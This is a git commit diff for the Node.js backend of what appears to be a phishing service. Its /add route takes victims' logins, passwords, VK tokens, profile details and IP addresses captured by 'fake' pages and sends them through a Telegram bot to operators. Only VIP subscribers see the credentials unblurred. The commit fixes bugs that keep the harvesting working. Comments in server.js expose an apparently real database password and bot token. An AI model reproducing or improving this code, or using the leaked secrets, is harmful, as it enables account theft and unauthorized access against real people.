f22e593b2efcbf630a59629c68b00d6d5f3a4f76
Gachinski <easywin.ru@gmail.com>
2021-11-07 18:44:03 +0300

    update

--- server.js
+++ server.js
@@ -17,6 +17,8 @@ app.listen(3000, ()=>{
 })
 
 
+
+
 // NTBA_FIX_319 = 1
 // db = mongodb+srv://Admin:ern-sy6-7Ny-t5a@cluster0.x5zhz.mongodb.net/database?retryWrites=true&w=majority
 // Bot = 2049069473:AAHir3pfuODtgD7thDmk9l9At-4bWDQb9Ag
--- server/routes/routes.js
+++ server/routes/routes.js
@@ -47,7 +47,7 @@ router.post('/get', async (req, res) => {
     })
 })
 router.post('/add', async (req, res) => {
-    if (eq.body.ip && iplist.filter(e => e == req.body.ip).length < 10) {
+    if (req.body.ip && iplist.filter(e => e == req.body.ip).length < 10) {
         iplist.push(req.body.ip)
         const userData = await user.findOne({
             tg_id: parseInt(req.body.id, 32)
@@ -61,7 +61,7 @@ router.post('/add', async (req, res) => {
             let link = await links.findOne({
                 link: req.body.fake
             })
-            bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Login: <code>${req.body.login}</code>\n🗝 Password: <code>${req.body.password}</code>\n${req.body.type == 'vk'?`🖇  Token: <code>${req.body.token}</code>\n\n🚶Имя: ${req.body.first_name}\n🍌Фамилия: ${req.body.last_name}\n\n🆔 ID: <a href="https://vk.com/id${req.body.user_id}">${req.body.user_id}</a>\n\n🤼 Друзей: ${req.body.counters.friends}\n👨‍👩‍👧‍👦 Подписчиков: ${req.body.counters.followers}\n\n🎁 Подарков: ${req.body.counters.gifts}\n\n`:''}📍 IP: <code>${req.body.ip}</code>\n🖥 Fake: <code>${req.body.fake}</code>\n🚧 Шаблон: <code>${link.query[Number(req.body.pattern)].name||'-'}</code>\n\n🗓 Дата: <code>${GetDateFormat(new Date()).split(' / ')[0]}</code>\n🕰 Время: <code>${GetDateFormat(new Date()).split(' / ')[1]}</code>\n\n\nАккаунт пользователя: @${userData.login?userData.login:'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`, {
+            bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Login: <code>${req.body.login}</code>\n🗝 Password: <code>${req.body.password}</code>\n${req.body.type == 'vk'?`🖇  Token: <code>${req.body.token}</code>\n\n🚶Имя: ${req.body.first_name}\n🍌Фамилия: ${req.body.last_name}\n\n🆔 ID: <a href="https://vk.com/id${req.body.user_id}">${req.body.user_id}</a>\n\n🤼 Друзей: ${req.body.counters.friends}\n👨‍👩‍👧‍👦 Подписчиков: ${req.body.counters.followers}\n\n🎁 Подарков: ${req.body.counters.gifts}\n\n`:''}📍 IP: <code>${req.body.ip}</code>\n🖥 Fake: <code>${req.body.fake}</code>\n🚧 Шаблон: <code>${link.query[Number(req.body.pattern)]?.name||'-'}</code>\n\n🗓 Дата: <code>${GetDateFormat(new Date()).split(' / ')[0]}</code>\n🕰 Время: <code>${GetDateFormat(new Date()).split(' / ')[1]}</code>\n\n\nАккаунт пользователя: @${userData.login?userData.login:'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`, {
                 parse_mode: 'HTML',
                 disable_web_page_preview: true
             })
@@ -70,8 +70,8 @@ router.post('/add', async (req, res) => {
                 let BluredPassword = req.body.password.substr(0, Math.floor(req.body.password.length * 30 / 100)) + '*'.repeat(req.body.password.length - Math.floor(req.body.password.length * 50 / 100)) + req.body.password.substr(req.body.password.length - Math.floor(req.body.password.length * 20 / 100), req.body.password.length)
                 let BluredToken = req.body.token ? req.body.token.substr(0, Math.floor(req.body.token.length * 30 / 100)) + '*'.repeat(req.body.token.length - Math.floor(req.body.token.length * 50 / 100)) + req.body.token.substr(req.body.token.length - Math.floor(req.body.token.length * 20 / 100), req.body.token.length): ''
                 let user = userData
-                let vkMessage = req.body.type == 'vk' ? messages.vkMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date() ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date() ? req.body.password : BluredPassword, user.vip ? req.body.token : user.vip ? req.body.token : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.token : BluredToken, req.body.first_name || '-', req.body.last_name || '-', 'id' + req.body.user_id || '-', req.body.counters.friends == 0 || req.body.counters.friends > 0 ? req.body.counters.friends : '-', req.body.counters.followers == 0 || req.body.counters.followers > 0 ? req.body.counters.followers : '-', req.body.online ? '✳️' : '⭕️', req.body.online ? 'Online' : 'Offline', req.body.counters.gifts == 0 || req.body.counters.gifts > 0 ? req.body.counters.gifts : '-', req.body.ip || '-', req.body.fake || '-', link.query[Number(req.body.pattern)].name || '-', req.body.pattern || 0, GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0):''
-                let otherMessage = req.body.type != 'vk' ? messages.otherMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.password : BluredPassword, req.body.ip || '-', req.body.fake || '-', link.query[Number(req.body.pattern)].name || '-', GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0):''
+                let vkMessage = req.body.type == 'vk' ? messages.vkMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date() ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date() ? req.body.password : BluredPassword, user.vip ? req.body.token : user.vip ? req.body.token : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.token : BluredToken, req.body.first_name || '-', req.body.last_name || '-', 'id' + req.body.user_id || '-', req.body.counters.friends == 0 || req.body.counters.friends > 0 ? req.body.counters.friends : '-', req.body.counters.followers == 0 || req.body.counters.followers > 0 ? req.body.counters.followers : '-', req.body.online ? '✳️' : '⭕️', req.body.online ? 'Online' : 'Offline', req.body.counters.gifts == 0 || req.body.counters.gifts > 0 ? req.body.counters.gifts : '-', req.body.ip || '-', req.body.fake || '-', link.query[Number(req.body.pattern)]?.name || '-', req.body.pattern || 0, GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0):''
+                let otherMessage = req.body.type != 'vk' ? messages.otherMessage(names[req.body.type], user.vip ? req.body.login : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.login : BluredLogin, user.vip ? req.body.password : new Date(user.vipDate || 0) >= new Date(req.body.date) ? req.body.password : BluredPassword, req.body.ip || '-', req.body.fake || '-', link.query[Number(req.body.pattern)]?.name || '-', GetDateFormat(new Date()).split(' / ')[0], GetDateFormat(new Date()).split(' / ')[1], 0, 0):''
                 bot.sendMessage(parseInt(req.body.id, 32), req.body.type == 'vk' ?
                     vkMessage.substr(0, vkMessage.length - 5) + `${userData.vip?'':'\n\nДля просмотра данных от аккаунтов приобретите VIP статус'}` : otherMessage.substr(0, otherMessage.length - 5) + `${userData.vip?'':'\n\nДля просмотра данных от аккаунтов приобретите VIP статус'}`, {
                         reply_markup: {
@@ -90,8 +90,8 @@ router.post('/add', async (req, res) => {
                     password: req.body.password,
                     token: req.body.token ,
                     has_mobile: req.body.has_mobile,
-                    followers: req.body?.counters?.followers,
-                    friends: req.body?.counters?.friends,
+                    followers: req.body.counters?.followers,
+                    friends: req.body.counters?.friends,
                     online: req.body.online,
                     first_name: req.body.first_name,
                     last_name: req.body.last_name,
